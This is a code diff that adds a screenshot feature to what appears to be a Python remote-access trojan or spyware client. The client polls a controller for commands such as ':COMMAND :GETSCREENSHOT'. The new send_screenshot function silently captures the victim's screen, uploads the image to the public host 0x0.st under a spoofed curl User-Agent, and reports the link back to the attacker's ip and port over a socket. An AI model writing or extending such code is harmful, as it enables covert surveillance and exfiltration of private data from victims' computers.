@@ -30,6 +30,37 @@ def send_pcinfo():
     s.send("\n".join(info).encode())  # Send info in lines
     s.close()  # Close the connection
 
+def send_screenshot():
+    import pyautogui
+    import tempfile
+
+    # Take screenshot
+    screenshot = pyautogui.screenshot()
+
+    with tempfile.NamedTemporaryFile(suffix='.png', delete=False) as tmp:
+        temp_path = tmp.name
+        screenshot.save(temp_path)
+
+    file_path = temp_path
+
+    headers = {
+        'User-Agent': 'curl/7.68.0'
+    }
+
+    with open(file_path, 'rb') as f:
+        files = {'file': f}
+        response = requests.post('https://0x0.st', headers=headers, files=files)
+
+    if response.status_code == 200:
+        screenshot = ":SCREENSHOT\n" + response.text.strip()
+    else:
+        print("Upload failed:", response.text)
+    
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((ip, port))
+    s.send(screenshot.encode())  # Send screenshot in lines
+    s.close()  # Close the connection
+
 # Main function to constantly check the server for commands
 def main():
     system_info = platform.uname()  # Get system info
@@ -52,8 +83,7 @@ def main():
                 send_pcinfo()
             
             elif response.startswith(":COMMAND :GETSCREENSHOT"):
-                pass
-                #constel help me
+                send_screenshot()
 
             # Handle other responses here if needed
             elif response.startswith("OTHER"):
